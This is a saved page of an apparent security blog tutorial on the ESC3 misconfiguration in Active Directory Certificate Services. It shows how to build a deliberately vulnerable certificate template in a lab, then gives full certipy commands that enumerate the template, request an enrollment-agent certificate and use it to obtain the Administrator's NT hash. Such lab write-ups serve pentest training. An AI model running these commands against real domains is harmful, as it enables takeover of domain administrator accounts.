<!DOCTYPE html>
<!-- saved from url=(0114)https://0xc4t.github.io/content.html?p=md/esc3-ad-cs-misconfigurations-exploitation-active-airectory-pentesting.md -->
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ESC3 ADCS Misconfigurations exploitation — Active Directory Pentesting</title>
    <meta property="og:type" content="website">
    <meta property="og:title" content="ESC3 ADCS Misconfigurations exploitation — Active Directory Pentesting">
    <meta property="og:description" content="ESC3 with Certificate Request Agent allows users to request certificates on behalf of other users, services, and entities within the domain. If the template is configured incorrectly, regular users can request certificates “on behalf of” accounts with higher privileges, which can then be used for authentication or to gain access equivalent to Domain Admin.">
    <meta property="og:site_name" content="0xc4t Posts">
    <meta property="og:image" content="https://miro.medium.com/v2/resize:fit:720/format:webp/1*djJafLFug7xG_cXxGg0z2Q.png">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="630">
    <link rel="stylesheet" href="../../style.css">
    <link rel="icon" type="image/x-icon" href="https://pbs.twimg.com/profile_images/1960719102932344837/T8Sl7V0i_400x400.jpg">
    </head>
  <body>
    <h1>0xc4t Notes</h1>
    <p class="slogan">
      <i>Web Security &amp; Active Directory Security</i>
    </p>
    <nav>
      <a href="https://0xc4t.github.io/index.html">Posts</a>
    </nav>
    <hr>
    <div id="content" class="content"><h2>ESC3 ADCS Misconfigurations exploitation — Active Directory Pentesting</h2>
<p>Active Directory Certificate Services (ADCS) is the target of the ESC3 certificate attack, where attackers exploit misconfigurations in certificate templates that can be used to perform privilege escalation and gain administrator accounts such as Domain Admin.</p>
<p>This attack would be significant when combined with a misconfiguration in the Certificate Request Agent (CRA).</p>
<p>Previously, I discussed ESC2, which we have already demonstrated. You can open my profile or click the following link for the ESC2 discussion.</p>
<h3>What is ESC3</h3>
<p>ESC3 with Certificate Request Agent allows users to request certificates on behalf of other users, services, and entities within the domain. If the template is configured incorrectly, regular users can request certificates “on behalf of” accounts with higher privileges, which can then be used for authentication or to gain access equivalent to Domain Admin.</p>
<h3>Lab setup</h3>
<p>Open Certificate Template configuration using WIN + R (certtempl.msc), then right-click on Certificate Templates -&gt; Manage.</p>
<p><img src="1_gxBf64JpBoKqL8OL-nOfMg.webp" alt="alt text"></p>
<p>After opening Manage, select the Certificate template. You can use either the “User” or “Code Signing” template. Right-click and select Duplicate Template.</p>
<hr>
<p><img src="1_JqQMbVpLSVC5PU8dWrhICA.webp" alt="alt text">
A window titled “Properties of New Template” will appear. Okay, let’s name the template first. You can open the General tab. In this case, I will name it ESC3 so that it will be easy to identify later.</p>
<hr>
<p><img src="1_7IkVObDtwqndCE2N19JsSg.webp" alt="alt text"></p>
<p>To make this vulnerable to ESC3 attacks, we need to go to the Security tab -&gt; Add Domain Users -&gt; Check the Enroll box, then click Apply.</p>
<hr>
<p><img src="1_DWhmXgU8dgeT5823e250KA.webp" alt="alt text"></p>
<p><img src="1_b1q_KvUZhzhD8LN5HPRLfA.webp" alt="alt text"></p>
<p>Continue configuration for the Extensions tab, select Application Policies, press Edit, and select Code signing -&gt; Remove.</p>
<hr>
<p><img src="1_YBUV2OnSbaOzzYn7HGIwMA.webp" alt="alt text"></p>
<p>Press Add and select Certificate Request Agent, then OK. Then apply and OK.</p>
<hr>
<p><img src="1_3ZiCUNT0R_IA08z9VulCsw.webp" alt="alt text"></p>
<p>Then we enable the certificate that we created earlier by opening certtempl.msc, selecting Certificate Template, and right-clicking on that tab. Then the Certificate To Issue option will appear.</p>
<hr>
<p><img src="1_ufdQaNcSgxokx7pKKC0ycg.webp" alt="alt text"></p>
<p>You can select the Certificate Template you created earlier and click OK.</p>
<hr>
<p><img src="1_-06-kzT8cRQ9AJVn8n6E0A.webp" alt="alt text"></p>
<hr>
<h3>Emumeration &amp; Exploitation</h3>
<p>After configuring or creating a lab for ESC3 exploitation, we can begin simulating our attack on the lab. In this case, I will use the built-in tools from Kali Linux, namely certipy, to perform enumeration and exploitation on this ESC3 misconfiguration. Let’s get started Certipy:</p>
<p>Using certipy, we can enumerate ADCS configurations using a regular domain user account.</p>
<pre><code class="language-bash">certipy-ad find -u 'elena.doe@sandbox.local' -p P@ssw0rd -dc-ip 10.100.150.10 -vulnerable -enabled
</code></pre>
<p><img src="1_1DS5UBfeh7XfVh2ze5qJag.webp" alt="alt text"></p>
<p>To identify misconfigurations in the ADCS template, we can read the file 20251022134310_Certipy.txt.</p>
<hr>
<p><img src="1_ZKsO10AYsCCSnaI5CZDI9Q.webp" alt="alt text"></p>
<p>Enrollment Agent is in True condition and if we scroll down again there is [!] Vulnerabilities ESC3: Template has Certificate Request Agent EKU set.</p>
<hr>
<p><img src="1_HcSYT4g__0fuZY6jMUIXog.webp" alt="alt text"></p>
<p>Okay, after we identify the misconfiguration, we can proceed to the exploitation stage. You can follow the Certipy command below.</p>
<p>Let’s try requesting a certificate for our user, in this case elena.doe with the domain sandbox.local.</p>
<pre><code class="language-bash">certipy req -u 'elena.doe@sandbox.local' -p 'P@ssw0rd' -dc-ip 10.100.150.10 -ca sandbox-DC01-CA -target 'dc.sandbox.local' -template 'ESC3'
</code></pre>
<p><img src="1_cmArZMKSHsxmv_YzN16H8w.webp" alt="alt text"></p>
<p>and we successfully obtained elena.doe.pfx, which we can use to make requests on behalf of the Administrator and use it to obtain the NT hash from the Administrator. You can follow the command below</p>
<pre><code class="language-bash">certipy req -u 'elena.doe@sandbox.local' -p 'P@ssw0rd' -dc-ip 10.100.150.10 -ca sandbox-DC01-CA -target 'dc.sandbox.local' -template 'User' -on-behalf-of administrator -pfx elena.doe.pfx
</code></pre>
<p><img src="1_djJafLFug7xG_cXxGg0z2Q.webp" alt="alt text"></p>
<p>Done. We successfully obtained the hash from the administrator and can use it for Pass The Hash to services on the DC (Domain Controller).</p>
<p>Okay, that’s all for this article. I hope this ADCS exploitation series can help you with exam certification or real-world pentesting/red teaming. Thank you, everyone. Love you all!</p>
<p>Reference</p>
<ul>
<li>https://www.hackingarticles.in/adcs-esc3-enrollment-agent-template/</li>
<li>https://www.rbtsec.com/blog/active-directory-certificate-services-adcs-esc3/</li>
<li>https://yangsirrr.github.io/2021/09/01/adcs-esc2-7attack/</li>
</ul>
</div>

    <div class="social-icons">
      <a href="https://www.instagram.com/0xc4t?utm_source=ig_web_button_share_sheet&amp;igsh=ZDNlZDc0MzIxNw==" target="_blank"><i class="fab fa-instagram"></i></a>
      <a href="https://x.com/iamvarel" target="_blank"><i class="fab fa-x-twitter"></i></a>
    </div>
    <div class="footer">
      © 2025 0xc4t
    </div>


</body></html>
